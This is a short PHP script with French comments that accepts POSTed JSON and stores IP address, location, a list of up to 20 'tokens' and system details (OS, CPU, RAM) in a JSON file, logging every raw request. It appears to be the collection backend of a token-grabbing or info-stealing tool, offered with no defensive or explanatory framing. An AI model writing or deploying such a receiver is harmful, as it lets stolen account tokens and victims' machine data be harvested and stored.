<?php
// Activer l'affichage des erreurs
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Enregistrer les données brutes pour débogage
file_put_contents('../data/debug.log', "Requête reçue: " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
file_put_contents('../data/debug.log', "Contenu: " . file_get_contents('php://input') . "\n\n", FILE_APPEND);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $raw_input = file_get_contents('php://input');
    file_put_contents('../data/debug.log', "Données brutes: $raw_input\n", FILE_APPEND);
    
    $data = json_decode($raw_input, true);
    
    if($data) {
        // Sanitization basique
        $entry = [
            'ip' => isset($data['ip']) ? filter_var($data['ip'], FILTER_VALIDATE_IP) : 'Inconnue',
            'location' => isset($data['location']) ? substr($data['location'], 0, 50) : 'Inconnue',
            'tokens' => isset($data['tokens']) ? array_slice($data['tokens'], 0, 20) : [],
            'system_info' => [
                'os' => isset($data['system_info']['os']) ? substr($data['system_info']['os'], 0, 30) : 'Inconnu',
                'cpu' => isset($data['system_info']['cpu']) ? substr($data['system_info']['cpu'], 0, 30) : 'Inconnu',
                'ram' => isset($data['system_info']['ram']) ? (int)$data['system_info']['ram'] : 0
            ],
            'timestamp' => time()
        ];
        
        $filename = '../data/data.json';
        $current_data = file_exists($filename) ? json_decode(file_get_contents($filename), true) : [];
        if (!is_array($current_data)) $current_data = [];
        array_unshift($current_data, $entry);
        file_put_contents($filename, json_encode(array_slice($current_data, 0, 100)));
        file_put_contents('../data/debug.log', "Données enregistrées avec succès\n", FILE_APPEND);
        echo "Succès";
    } else {
        file_put_contents('../data/debug.log', "Erreur de décodage JSON: " . json_last_error_msg() . "\n", FILE_APPEND);
        echo "Erreur: JSON invalide";
    }
}
